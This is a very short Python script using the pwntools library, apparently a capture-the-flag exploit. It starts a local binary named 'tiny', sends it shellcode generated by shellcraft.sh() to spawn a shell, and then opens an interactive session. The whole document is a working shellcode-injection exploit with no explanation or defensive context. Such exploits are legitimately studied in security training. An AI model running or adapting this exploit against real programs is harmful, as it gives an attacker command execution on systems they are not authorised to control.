from pwn import *

p = process('./tiny')

log.info(p.clean())
p.sendline(asm(shellcraft.sh()))
log.info(p.clean())
p.interactive()